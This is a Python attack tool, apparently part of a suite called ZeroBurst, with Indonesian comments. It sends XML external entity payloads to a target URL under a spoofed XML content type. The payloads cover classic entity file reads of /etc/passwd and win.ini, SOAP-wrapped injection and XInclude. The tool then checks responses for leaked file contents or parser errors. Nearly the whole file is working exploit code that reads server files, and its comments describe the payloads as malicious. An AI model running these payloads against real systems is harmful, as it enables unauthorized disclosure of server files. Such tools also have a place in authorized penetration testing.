import requests
import copy
from colorama import Fore, Style

class XXEHunter:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'ZeroBurst-XXE-Hunter/18.0 (Content-Type-Spoofing)',
            'Accept': '*/*'
        }
        
        # Database Signature (Bukti Sukses)
        self.signatures = {
            'LINUX': r"root:x:0:0",
            'WINDOWS': r"\[extensions\]|\[fonts\]|\[files\]",
            'PHP_EXPECT': r"PHP Version", # Jika RCE via expect:// berhasil
            'ERROR_LEAK': r"DOMDocument::loadXML|SAXParser|XMLReader"
        }

    def generate_payloads(self):
        """
        Menghasilkan payload XXE Berbahaya (Linux & Windows).
        Kita bungkus dalam struktur XML umum.
        """
        payloads = []
        
        # 1. CLASSIC FILE READ (Linux /etc/passwd)
        xml_linux = """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>"""
        payloads.append({'type': 'Classic XXE (Linux)', 'xml': xml_linux, 'sig': 'LINUX'})

        # 2. CLASSIC FILE READ (Windows win.ini)
        xml_win = """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
        <foo>&xxe;</foo>"""
        payloads.append({'type': 'Classic XXE (Windows)', 'xml': xml_win, 'sig': 'WINDOWS'})

        # 3. SOAP INJECTION (Untuk Web Services)
        # Mencoba menyuntikkan entity di dalam struktur SOAP Envelope
        xml_soap = """<?xml version="1.0"?>
        <!DOCTYPE soap [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <stockCheck><productId>&xxe;</productId></stockCheck>
          </soap:Body>
        </soap:Envelope>"""
        payloads.append({'type': 'SOAP XXE Injection', 'xml': xml_soap, 'sig': 'LINUX'})

        # 4. XINCLUDE ATTACK (Alternative technique)
        # Berguna jika DOCTYPE dilarang tapi XInclude aktif
        xml_xi = """<?xml version="1.0"?>
        <foo xmlns:xi="http://www.w3.org/2001/XInclude">
        <xi:include parse="text" href="file:///etc/passwd"/>
        </foo>"""
        payloads.append({'type': 'XInclude Attack', 'xml': xml_xi, 'sig': 'LINUX'})

        return payloads

    def run_scan(self):
        print(f"\n{Fore.CYAN}[*] MODULE START: Deep XXE Hunter (XML Injection){Style.RESET_ALL}")
        print(f"{Fore.WHITE}[*] Target: {Fore.GREEN}{self.target}")
        print(f"{Fore.WHITE}[*] Strategy: Content-Type Spoofing (JSON -> XML)")
        
        payload_list = self.generate_payloads()
        total_vulns = 0

        # Strategi Serangan: Kita ubah method jadi POST (walaupun awalnya GET)
        # Dan kita ubah Content-Type jadi application/xml
        # Ini teknik "Downgrade Attack" pada parser.
        
        print(f"{Fore.YELLOW}[+] Attempting to force XML parsing on endpoint...{Style.RESET_ALL}")

        for p in payload_list:
            try:
                # Headers khusus untuk memaksa parsing XML
                headers_attack = self.session.headers.copy()
                headers_attack['Content-Type'] = 'application/xml' 
                
                # Kirim POST request dengan body XML jahat
                res = self.session.post(self.target, data=p['xml'], headers=headers_attack, timeout=8)
                
                content = res.text
                
                # 1. Cek File Leak (Critical)
                sig_key = p['sig']
                import re
                if re.search(self.signatures[sig_key], content):
                    print(f"   {Fore.RED}[CRITICAL] XXE VULNERABILITY CONFIRMED!{Style.RESET_ALL}")
                    print(f"   ├── Technique : {p['type']}")
                    print(f"   ├── Payload   : {Fore.YELLOW}<!ENTITY xxe SYSTEM ...>{Style.RESET_ALL}")
                    print(f"   └── Proof     : Content leaked from server file system!")
                    total_vulns += 1
                    break # Stop jika sudah tembus
                
                # 2. Cek Error Leak (High)
                # Jika server memuntahkan error XML parser, berarti dia memproses XML kita
                if re.search(self.signatures['ERROR_LEAK'], content):
                    print(f"   {Fore.MAGENTA}[HIGH] XML PARSING ERROR DETECTED!{Style.RESET_ALL}")
                    print(f"   ├── Info: Server tried to parse our malicious XML.")
                    print(f"   └── Risk: Potential Blind XXE (requires OOB testing).")
            
            except Exception as e:
                pass

        print("-" * 60)
        if total_vulns > 0:
            print(f"{Fore.RED}[!!!] SCAN COMPLETE: Target allows XML Entity Expansion.{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[OK] Target ignored XML payloads or is secure.{Style.RESET_ALL}")

def run_xxe_scan(url):
    engine = XXEHunter(url)
    engine.run_scan()